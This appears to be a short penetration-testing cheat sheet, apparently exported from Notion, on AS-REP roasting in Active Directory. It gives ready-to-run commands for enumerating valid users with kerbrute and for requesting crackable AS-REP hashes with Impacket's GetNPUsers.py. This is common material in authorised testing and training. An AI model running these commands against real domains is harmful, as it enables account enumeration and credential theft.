# Kerbrute + GetNPUsers: AS-Rep Roast

OS: Active_Directory, Windows
Description: Kerbrute + GetNPUsers: AS-Rep Roast
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

- Kerbrute (Get Valid Users)

```jsx
kerbrute userenum -d Targetdomain.local --dc 172.16.5.5 /opt/jsmith.txt 
```

- Impacket, test each one

```jsx
GetNPUsers.py Targetdomain.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```